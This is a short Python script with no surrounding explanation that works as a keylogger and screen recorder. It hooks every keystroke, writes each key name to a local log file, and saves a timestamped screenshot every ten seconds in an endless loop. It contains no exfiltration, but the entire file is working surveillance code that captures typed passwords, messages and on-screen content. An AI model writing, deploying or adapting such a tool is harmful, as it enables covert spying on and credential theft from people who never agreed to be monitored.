import keyboard 
import datetime
import pyautogui
import time
import os


keyboard.unhook_all()

file = open("./log.txt", "w", encoding="utf-8")

def on_key(key):
    file.write(str(key.name + "\n"))
    file.flush()
   
               
keyboard.hook(on_key)
          
               
               
               
if not os.path.exists("./screenshots"):
    os.mkdir("./screenshots")

while True:
    time.sleep(10)
    datum = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename ="./screenshots/" + datum + ".jpg"
    pyautogui.screenshot(filename)